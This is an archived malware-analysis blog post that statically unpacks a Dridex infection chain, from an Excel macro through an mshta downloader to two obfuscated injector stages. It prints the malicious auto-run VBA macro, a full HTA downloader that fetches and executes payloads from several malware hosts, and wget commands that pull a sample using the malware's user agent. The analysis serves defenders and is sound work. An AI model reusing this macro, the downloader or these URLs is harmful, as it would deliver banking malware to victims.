{
    "id": "d939d526-ae97-49e6-b984-e375ef836705",
    "created_at": "2023-01-12T15:06:24.338626Z",
    "updated_at": "2025-03-27T02:13:34.644474Z",
    "deleted_at": null,
    "sha1_hash": "3ce0bc18dff28c3a3948406a16c168bcea7bc418",
    "title": "2022-03-13 - Cutting corners against a Dridex downloader",
    "authors": "",
    "file_creation_date": "2022-05-28T23:22:57Z",
    "file_modification_date": "2022-05-28T23:22:57Z",
    "file_size": 1798888,
    "plain_text": "# Cutting corners against a Dridex downloader\n\n**malcat.fr/blog/cutting-corners-against-a-dridex-downloader/**\n\n**Sample:**\n\n[6f8f1b26324ea0f3f566fbdcb4a61eb92d054ccf0300c52b3549c774056b8f02 (Bazaar,](https://bazaar.abuse.ch/sample/6f8f1b26324ea0f3f566fbdcb4a61eb92d054ccf0300c52b3549c774056b8f02/) [VT,](https://www.virustotal.com/gui/file/6f8f1b26324ea0f3f566fbdcb4a61eb92d054ccf0300c52b3549c774056b8f02) [AnyRun)](https://app.any.run/tasks/b09f87f9-5a26-49fb-9f1a-4d2aa5eb5212/)\n\n**Infection chain:**\n\nExcel -> mshta downloader -> x86 injector -> x86 injector -> Dridex first stage\n\n**Difficulty:**\n\nIntermediate\n\n## The downloader\n\n Excel document\n\nThe sample we are going to dissect came as a 728KB Excel 97 document inside an email. The OLE container is\npretty simple: most of its space is taken by the Excel Workbook (711KB). The rest is made of metadatas (claim to\nbe `Invoice 720710 from Quickbooks, LLC ) and a small VBA project. A legit-looking picture from GlobalSign`\non the first Excel sheet tells the user to enable editing + content in order to decrypt the office document. This\nmanipulation will indeed enable and run the document (malicious) macros.\n\nFigure 1: Excel decoy sheet\n\n\n-----\n\nThe VBA project contains a single `WorkBook_Open macro. In Excel, the` `WorkBook_Open macro is automatically`\nrun when the document is opened. By hitting F4 in Malcat, we can decompile the VBA code:\n```\n  Sub WorkBook_Open()\n    For Each qHundredMillions In ActiveWorkbook.Sheets(\"Sheet1\").Range(\"A65:O2886\")\n      If qHundredMillions.Value > 0 Then\n        qUnlockedCells = qUnlockedCells & Chr(qHundredMillions.Value)\n      End If\n    Next qHundredMillions\n  Set qPCX = CreateObject(\"Scripting.FileSystemObject\")\n    With qPCX\n      Set qLine = .CreateTextFile(Environ(\"ALLUSERSPROFILE\") &\n  \"\\qRangeAutoFormatLocalFormat3.sct\")\n  qLine.Write (qUnlockedCells)\n  qLine.Close\n    End With\n  With CreateObject(\"Wscript.Shell\")\n  .Exec (\"mshta \" & Chr(34) & Environ(\"ALLUSERSPROFILE\") & \"\\qRangeAutoFormatLocalFormat3.sct\" &\n  Chr(34))\n  End With\n  End Sub\n\n```\nThe macro is pretty straightforward, and write the content of the sheet cells from A65 up to O2886 into a file, before\nrunning the file through the mshta.exe program. As we already suspected given the size of the Workbook stream, it\nmeans that the payload is actually stored inside the sheet cells.\n\nMalcat can parse both Biff8 (.xls) and Biff12 (.xlsb) Excel binary documents. Just double-click on the Workbook\nstream in the Virtual File System tab of the OLE container and you can inspect the content of the excel document.\nTo display cell values and (decompiled) formulas, you can hit F4. This time there is no formula inside the sheet, but\na lot of numerical values inside the cells lies in the ascii range, which is kind of unusual.\n\n## Extracting the Mshta Downloader\n\nThe cells are displayed in order in the decompiler view, so it should be easy to recover the written file\nprogrammatically. We can do it two ways:\n\n|Col1|Sub WorkBook_Open() For Each qHundredMillions In ActiveWorkbook.Sheets(\"Sheet1\").Range(\"A65:O2886\") If qHundredMillions.Value > 0 Then qUnlockedCells = qUnlockedCells & Chr(qHundredMillions.Value) End If Next qHundredMillions Set qPCX = CreateObject(\"Scripting.FileSystemObject\") With qPCX Set qLine = .CreateTextFile(Environ(\"ALLUSERSPROFILE\") & \"\\qRangeAutoFormatLocalFormat3.sct\") qLine.Write (qUnlockedCells) qLine.Close End With With CreateObject(\"Wscript.Shell\") .Exec (\"mshta \" & Chr(34) & Environ(\"ALLUSERSPROFILE\") & \"\\qRangeAutoFormatLocalFormat3.sct\" & Chr(34)) End With End Sub|\n|---|---|\n\n\n-----\n\nCopy paste the content of the F4 view (starting at the cell `$B$65 ) into an editor and post process it using`\npython or your text editor of choice macros.\nUse Malcat's scripting to iterate over the cell values and reconstruct the file.\n\nWe will choose the second solution. Using Malcat's script engine, we have access to the file format parser and its\nresult in the `malcat.analyzer variable. In this case, the Biff8 file format parser (in`\n```\ndata/filetypes/Office.Workbook8.py ) stores some extra cell information in its sheets variable. Go to the\n\n```\nscript editor view via F8 and enter the following script:\n```\n  res = bytearray()\n  sheet1 = malcat.analyzer.sheets[1]\n  for cell, val in\n  sheet1.values.items():\n    if type(val) == float and val\n  > 0:\n      res.append(int(val))\n  gui.open_after(bytes(res),\n  \"droppped\")\n\n```\nWe obtain the following HTML file (comments have been removed for clarity):\n```\n  <!DOCTYPE html>\n  <html>\n  <head>\n  <HTA:APPLICATION ID=\"CS\"\n  APPLICATIONNAME=\"Test\"\n  WINDOWSTATE=\"minimize\"\n  MAXIMIZEBUTTON=\"no\"\n  MINIMIZEBUTTON=\"no\"\n  CAPTION=\"no\"\n  SHOWINTASKBAR=\"no\">\n  <script type=\"text/vbscript\" LANGUAGE=\"VBScript\" >\n  On Error Resume Next\n  For Each qDialogWorkbookCopy in Array(\"http://onlinefastsolutions.com:8088/tpls/file3.bin\",\n  \"http://onlinefastsolutions.com:8088/images/details.bin\",\"http://fasteasyupdates.com:8088/vendors/file4.\n  bin\",\n    \"http://onlinefastsolutions.com:8088/js/file1.bin\",\n    \"http://buyer-remindment.com:8088/fonts/file8.bin\",\n    \"http://buyer-remindment.com:8088/css/file7.bin\",\n    \"http://onlinefastsolutions.com:8088/images/file13.bin\",\n    \"http://insiderushings.com:8088/js/file13.bin\",\n    \"http://buyer-remindment.com:8088/tpls/file4.bin\",\n    \"http://paymentadvisry.com:8088/wp-theme/file7.bin\")\n    Set qDialogWorkspace = createobject(\"MSXML2.ServerXMLHTTP.6.0\")\n    Set qSortValues = createobject(\"Adodb.Stream\")\n    qDialogWorkspace.Open \"GET\", qDialogWorkbookCopy, False\n    qDialogWorkspace.setRequestHeader \"User-Agent\", \"qWK3FM3\"\n    qDialogWorkspace.Send\n    If qDialogWorkspace.Status = 200 And Len(qDialogWorkspace.ResponseBody)>1000 Then\n    Set qTriangle = CreateObject(\"Wscript.Shell\")\n    with qSortValues\n      .type = 1 \n      .open\n      .write qDialogWorkspace.responseBody\n      .savetofile qTriangle.ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") &\n  \"\\qDialogMainChartType.exe\", 2 \n    end with\n    qTriangle.Exec(qTriangle.ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") &\n  \"\\qDialogMainChartType.exe\")\n    Exit For\n    End If\n  Next\n  </script>\n  </head>\n  <body>\n\n```\n|Col1|res = bytearray() sheet1 = malcat.analyzer.sheets[1] for cell, val in sheet1.values.items(): if type(val) == float and val > 0: res.append(int(val)) gui.open_after(bytes(res), \"droppped\")|\n|---|---|\n\n\n-----\n\n```\n   y\n</html>\n\n```\n\n-----\n\nThe Mshta script listed above is a pretty straightforward downloader. Let's just try to WGET one of the url:\n```\n  $ wget \"http://buyer-remindment.com:8088/fonts/file8.bin\"\n  Resolving buyer-remindment.com... 208.83.69.35, 163.172.213.69,\n  128.199.243.169\n  Connecting to buyer-remindment.com|208.83.69.35|:8088... connected.\n  HTTP request sent, awaiting response... 404 Not Found\n\n```\nHmm no luck. But maybe they do User-Agent filtering. Let's use the user agent provided in the script:\n```\n  $ wget -U qWK3FM3 \"http://buyer-remindment.com:8088/fonts/file8.bin\"\n  Resolving buyer-remindment.com... 208.83.69.35, 163.172.213.69,\n  128.199.243.169\n  Connecting to buyer-remindment.com|208.83.69.35|:8088... connected.\n  HTTP request sent, awaiting response... 200 OK\n  Length: 167936 (164K) [application/octet-stream]\n  Saving to: 'file8.bin'\n  file8.bin     100%[============================>] 164.00K  349KB/s  in\n  0.5s\n\n```\nBingo, we have the file!\n\n## The first stage\n\n Locating the payload\n\nThe downloaded file is a 167KB PE file of sha256\n\n`277089cb78a9c493cecd8f5fbe70df0577d4f9557fb8b55ff5f7c2505308ca3a` [(Bazaar,](https://bazaar.abuse.ch/sample/277089cb78a9c493cecd8f5fbe70df0577d4f9557fb8b55ff5f7c2505308ca3a/) [VT,](https://www.virustotal.com/gui/file/277089cb78a9c493cecd8f5fbe70df0577d4f9557fb8b55ff5f7c2505308ca3a/detection) [AnyRun) and plays in](https://app.any.run/tasks/7c42771a-1760-43bf-afda-5d86abcf0034/)\na higher league. We don't know much about the file since both the version informations and the rich header seem\nfake. And while the number of identified functions seems low (55), most of them seem obfuscated. How to be sure\nthey are obfuscated? Well there are a lot of fake API calls, a lot of useless arithmetic operations, and the control\nflow graph (F4) of some of the functions look like this:\n\n|Col1|$ wget \"http://buyer-remindment.com:8088/fonts/file8.bin\" Resolving buyer-remindment.com... 208.83.69.35, 163.172.213.69, 128.199.243.169 Connecting to buyer-remindment.com|208.83.69.35|:8088... connected. HTTP request sent, awaiting response... 404 Not Found|\n|---|---|\n\n|Col1|$ wget -U qWK3FM3 \"http://buyer-remindment.com:8088/fonts/file8.bin\" Resolving buyer-remindment.com... 208.83.69.35, 163.172.213.69, 128.199.243.169 Connecting to buyer-remindment.com|208.83.69.35|:8088... connected. HTTP request sent, awaiting response... 200 OK Length: 167936 (164K) [application/octet-stream] Saving to: 'file8.bin' file8.bin 100%[============================>] 164.00K 349KB/s in 0.5s|\n|---|---|\n\n\n-----\n\nFigure 2: CFG of an obfuscated function\nWhile I enjoy pure static analysis, this would be the point where I would normally switch to dynamic analysis.\nReversing obfuscated code is not really fun. But on the other hand, dealing with anti-VM and anti-debugging tricks\nis also not very fun. So let's give static analysis a chance. Since looking at the code there won't bring us much, we\nwill first do the usual preliminary work: locating the payload data. We have two high-entropy buffers there:\n\none in the .text section at approximatively `0x10002a8d - 0x10012ab8 (about 0x1002b bytes): this will be`\nbuffer A\none in the .data section at approximatively `0x1001619f - 0x10026265 (about 0x100c6 bytes): this will be`\nbuffer B\n\nThis definitely looks like payload material. Then we will look for cross-references to these two buffers (right-click on\nthe first byte in data view, and choose cross-references).\n\n\n-----\n\nFigure 3: The two obfuscated buffers\nThere is exactly one cross-reference for each of these buffers:\n\none cross-reference to buffer A in the .data section at address `0x10026264 . The pointer itself is not`\nreferenced.\none cross-reference to buffer B in the .data section at address `0x10026200 . The pointer is itself referenced`\nby the function `sub_10013940 at address` `0x100139f4`\n\nThe first buffer looks like a dead-end, let us have a look at the second, and more particularly to the function\n```\nsub_10013940 .\n\n## Reversing the decryption function\n\n```\nLike the rest of the code, this function is obfuscated and code is bloated with arithmetic operations. But decompilers\nare notably good at one thing: constant propagation. So let us run the Sleigh decompiler (double-press F4) and\nhave a look at the decompiled code:\n```\n  xunknown4 sub_10013940(int4 param_1)\n  {\n    int4 iVar1;\n    int4 iVar2;\n    int4 iVar3;\n    int4 iStack80;\n    int4 iStack72;\n    int4 iStack60;\n    int4 iStack52;\n    iStack52 = 0;\n    iStack72 = 0;\n    do {\n      iStack52 = (*(iStack72 * 100 + 0x100261e8) + iStack52) - *(iStack72 * 100 + 0x100261a4);\n      iStack72 = iStack72 + 1;\n    } while (iStack72 != 2);\n    iVar1 = sub_100011c0(4, iStack52); // most likely a malloc\n    iStack60 = 0;\n    iStack80 = 0;\n    do {\n       iVar3 = iStack60 * 100;\n\n```\n\n-----\n\n```\n          ( ) ( );\n    sub_10013b50(iVar1 + iStack80, *(iVar3 + 0x10026200), iVar2);  // function looks like\nmemcpy(dst, src, size)\n    iStack80 = iVar2 + iStack80;\n    iStack60 = iStack60 + 1;\n  } while (iStack60 != 2);\n  sub_100136f0(iVar1, iVar1, iStack52);\n  *(param_1 + 8) = iVar1 + 0x2b7e;\n  *(param_1 + 0x14) = 0x1d400;\n  *(param_1 + 4) = iVar1 + 0x20;\n  *(param_1 + 0xc) = 0x2600;\n  return 0;\n}\n\n```\n\n-----\n\nI know that the abstract of this blog post promised very few reverse engineering, but it is time to plug in our brain for\na few seconds and have a quick look at the decompiled code:\n\nthe two loops each loops twice. Two is also the number of our buffers...\n```\n   iStack52 in the first do-while loop is the sum of ( [0x100261e8] - [0x100261a4] ) = 0x10000 and\n\n```\n( [0x100261e8 + 100] - `[0x100261a4 + 100] ) =` `0x10000, which could be the sizes of our two buffers`\n```\n   iVar1 seems to points to a buffer of size iStack52\n   sub_10013b50, once decompiled, looks like a simple memcpy\n\n```\nduring the first loop turn of the second do-while, the memcpy call copies `[0x10026200] (our buffer B`\nreference, see above) to `iVar1,` `iVar2 seems to be the size of buffer B (0x10000)`\nduring the second loop turn of the second do-while, the memcpy call copies `[0x10026200 + 100] =`\n```\n   [0x10026264] (which is actually our buffer A reference, see above) to iVar1 + 0x10000\n\n```\nSo without reversing further, we can roughly infer that:\n\nbuffer B and buffer A are actually both 0x10000 bytes big\nour two buffers are concatenated into the iVar1 buffer (buffer B followed by buffer A)\nfunction `sub_100136f0 gets called on the result`\n\nSo that wasn't too much complicated until now. Now let's have a look at `sub_100136f0 :`\n```\n  void sub_100136f0(xunknown4 param_1, xunknown4 param_2, xunknown4\n  param_3)\n  {\n    xunknown4 xVar1;\n    xunknown1 axStack272 [256];\n    xVar1 = 0x3b;\n    sub_10012d50(axStack272, 0x10015161, 0x3b);\n    sub_10013ca0(axStack272, param_1, param_2, param_3, xVar1);\n    return;\n  }\n\n```\nLooks like this function calls two sub-functions which both use a 256 bytes buffer internally ( axStack272 ). The\nfirst function `sub_10012d50 takes as parameters the 256 bytes buffer, a pointer to some high-entropy data (at`\n```\n0x10015161 ) and the integer 0x3b. If we looks at the decompiled code of sub_10012d50, it should ring some\n\n```\nbells for malware analysts:\n\n|Col1|void sub_100136f0(xunknown4 param_1, xunknown4 param_2, xunknown4 param_3) { xunknown4 xVar1; xunknown1 axStack272 [256]; xVar1 = 0x3b; sub_10012d50(axStack272, 0x10015161, 0x3b); sub_10013ca0(axStack272, param_1, param_2, param_3, xVar1); return; }|\n|---|---|\n\n\n-----\n\nFigure 4: decompiled code of sub_10012d50\nWe see indeed a first loop which initialises a 256 bytes buffer with values from 0 to 255, and a second loop which\npermutes some of the cells of the buffer. It looks a lot like a RC4 initialisation function. So instead of reversing\nfurther, we will first verify if our hypothesis holds. We will append 0x20000 bytes to the end of the file, concatenate\nbuffer B and buffer A in this overlay and try to decrypt the two buffers using Malcat's RC4 transform and the 0x3b\nbytes key at `0x10015161 (small tip: first open a copy of the program with 0x20000 additional bytes at the end of`\nthe file to make room for the concatenated buffers):\n\n\n-----\n\nFigure 5: concatenating and decrypting the two buffers\nIt works! Well, kind of at least. This definitely looks like a PE file, but parts of the MZ and PE headers are still\nencrypted. This is a common anti-dump trick used to confuse signature-based memory dumpers. The first 32 bytes\nof the result (all set to zero) also seems useless, which would explain the line `*(param_1 + 4) = iVar1 +`\n```\n0x20; in function sub_10013940 .\n\n## Reconstructing the headers\n\n```\nObviously, some other function in the program is responsible for fixing the MZ and PE headers of the decrypted\nbuffer. So, we should navigate through the obfuscated code and locate it right? But since the PE header seems to\nbe only partially encrypted (the string `\"This program cannot be run in DOS mode\" is still visible as well as`\nsection names), we could try to be smarter and save some time. Let us diff the decrypted buffer with another valid\nPE, for instance the first layer (chances are they have been generated using the same compiler, which makes the\njob easier).\n\nTo do this, first dump the decrypted buffer (minus the first 32 bytes which are all zero) into a file. Let's call it\n```\nlayer2_original.bin . Then, select both the first layer ( file8.bin ) and the buffer ( layer2_original.bin )\n\n```\ninside your explorer and drag them into Malcat in order to diff them. You can switch between the hex view and the\nstructure view (F2) to see which MZ/PE fields have been encrypted. You should see something like this (minus the\ncomments ofc):\n\n\n-----\n\nFigure 6: Left: first layer (aka our reference program), right: decrypted buffer with obfuscated bytes\nAs we can see on the picture, only a few spots in the headers of the decrypted buffer seem to have been\nencrypted:\n\nThe first 6 bytes of the MZ header: `[#0-#6[`\nThe last field of the MZ header, AddressOfPEHeader: `[#3c-#40[`\nThe rich headers are different, but we can safely ignore them\nThe first 6 bytes of the PE header: `[#c8-cd[`\nEnd of PE header + start of OptionalHeader, also 6 bytes: `[#dc-#e2[`\nExport director entry in the data directory, also 6 bytes: `[#140-#146[`\n\nThe rest of the differences are all somehow making sense, we are diffing different programs after all. So we will\nstart patching back the obfuscated bytes using our reference program:\n\nWe will copy the first 6 bytes from `file8.bin to` `layer2.bin`\nWe will patch the AddressOfPEHeader field with the value `0xc8 (since the rich header is 8 bytes less than in`\n```\n   file8.bin )\n\n```\nWe will copy the first 6 bytes of the PE header from `file8.bin` `[#d0-#d6[ to` `layer2.bin` `[#c8-#cd[`\nWe will copy end of PE header + start of OptionalHeader from `file8.bin` `[#e4-#ea[ to` `layer2.bin`\n\n```\n[#dc-#e2[\n\n```\n\nWe can safely ignore the obfuscated export directory. Once the patching is done, hit Ctrl+R to reanalyze the\npatched file and Malcat should now recognize it as a PE file. The headers should then look like in the picture below.\n[For the lazy readers, you can download the patched file here (password: infected).](https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/layer2.zip)\n\n\n-----\n\nFigure 7: Decrypted buffer after patching back the headers\n\n## The second stage\n\n Locating the payload and the decryption function\n\nThe second layer comes as a tiny PE file with a huge high-entropy overlay. At this stage, since we did not analyse\nmost of the code of the first stage program, it is not clear how the second layer is run. It is possible that the overlay\nwould have been put inside an allocated memory region before running the second stage. But it definitely looks\nencrypted and thus pretty interesting.\n\n\n-----\n\nFigure 8: 32 bytes long repeats inside the encrypted payload of second stage\nSince the payload is in the overlay (or inside an allocated memory buffer), we can't just look for cross-references\nlike we did in the first stage. We could look for the decryption function inside the .code section, but sadly the code is\nalso obfuscated. Fortunately, by looking at the encrypted data, we can see some 32 bytes long pattern which get\nrepeated a few times. This means two things:\n\nThe payload has been encrypted using a 32 bytes key\nThe cipher algorithm is most likely a stream cipher, and a pretty simple one\n\nSo instead of looking for references or code, let us look for a 32-bytes long key, i.e a referenced, high-entropy, 32\nbytes long, data block. The second stage is quite small, and there is only one data block in the .rdata section which\nfits this description: `[0x40304e-0x40306d[ . The key candidate is referenced by a pointer at address` `0x404018,`\nwhich is itself referenced by the very similar functions `sub_401301 and` `sub_401549 . Let us have a look at the`\nfirst one:\n\n\n-----\n\n```\nxunknown4 sub_401301(int4 param_1)\n{\n  int4 iVar1;\n  uint4 uVar2;\n  uint4 uVar3;\n  int4 iStack32;\n  iVar1 = *(param_1 + 0x54); // data pointer\n  uVar2 = *(param_1 + 0x20); // data size\n  iStack32 = 0;\n  do {\n    uVar3 = *(iStack32 * 4 + 0x40401c);   // randomized starting index\n    while (uVar3 < uVar2) {\n      *(iVar1 + uVar3) = *(iVar1 + uVar3) + (*([0x00404018] + (uVar3 & 0x1f)) ^ 0xff); //\n0x00404018 is a pointer to our key candidate\n      uVar3 = uVar3 + 0xff;\n    }\n    iStack32 = iStack32 + 1;\n  } while (iStack32 != 0xff);\n  return 0;\n}\n\n```\n\nThis definitely looks like a decryption function, with a key of size 32 (see the `uVar3 & 0x1f ?).`\n\n## Decoding the overlay\n\nThe buffer seems to be decrypted by ADDing the key bytes XOR `0xff (aka performing a NOT on the key bytes`\nand then adding the key bytes to the buffer).\n\nThere seem to be a twist though. At address `0x40401c we can find an array of 255 dwords, which is a random`\npermutation of the `[0 .. 254] interval. This array seems to be used as starting index ( uVar3 ) to decrypt every`\n255th byte of the buffer. Why would they do that? I don't know, it does not look like obfuscation. It is most likely an\n\n\n-----\n\nanti dump technique, since some dumpers detect decryption function by looking for sequential writes. This makes\nsure that the decryption output stream is not written sequentially indeed.\n\nAnyway, we can safely ignore this part of the code since the order of write is irrelevant to us. Let us try to decrypt\nthe buffer using Malcat's transforms. We will first NOT the key, and use the result as key for the `add8 algorithm`\n(which is just a add using a repeated key):\n\nFigure 9: decoding the overlay using key at 0x40304e\nAnd it works, we get a 119808 bytes PE file! But again, parts of the MZ and PE headers seem to be obfuscated :(\nWe won't go through the header reconstruction again, it is the exact same process as for the first stage. Just be\ncareful this time, the Rich header being bigger, the PE header starts at offset `0xe8 . You can download the`\n[patched file here (password: infected).](https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/layer3.zip)\n\n[The resulting PE is only slightly obfuscated this time. A quick look at Virustotal tells us that this is a Dridex sample.](https://www.virustotal.com/gui/file-analysis/NGMwNzc4NzBlN2QyZWRhNzk0MjA0MDYyOWM1NzI2OTk6MTYzMTE3NTQzNA==)\nAnd this time we can be pretty sure that this is the final stage:\n\ncode is less obfuscated (only some constant obfuscation, and strings seem to be encrypted too)\nthere is way more code than data, which would be weird for a dropper/injector\nwe can see some plain-text constants which make little sense for a dropper, like the ITaskService GUID at\naddress `0x41c960`\n\nThis is not the main Dridex component though, but the Dridex downloader, since Dridex is a complex multi-stage\nmalware. Decrypting the strings and configuration may be the subject of another article.\n\n## Conclusion\n\n\n-----\n\nWe have seen how to navigate inside an Excel document, its sheets and its macros and how to statically extract its\npayload using Malcat. We also have seen how to circumvent native code obfuscation by ignoring the code and\nfocusing on the data (and using a bit of guessing).\n\nStatic unpacking is not reserved to simple malware and can also be used for modern complex families like this\nDridex dropper. By focusing on the data instead of the code, we were able to go through the different stages of the\ndropper with ease and could completely ignore the obfuscation layers.\n\nI hope that you enjoyed this rapid unpacking session. As usual, feel free to share with us your remarks or\nsuggestions!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-13 - Cutting corners against a Dridex downloader.pdf"
    ],
    "report_names": [
        "2022-03-13 - Cutting corners against a Dridex downloader.pdf"
    ],
    "threat_actors": [
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535984,
    "ts_updated_at": 1743041614,
    "ts_creation_date": 1653780177,
    "ts_modification_date": 1653780177,
    "files": {
        "pdf": "https://archive.orkl.eu/3ce0bc18dff28c3a3948406a16c168bcea7bc418.pdf",
        "text": "https://archive.orkl.eu/3ce0bc18dff28c3a3948406a16c168bcea7bc418.txt",
        "img": "https://archive.orkl.eu/3ce0bc18dff28c3a3948406a16c168bcea7bc418.jpg"
    }
}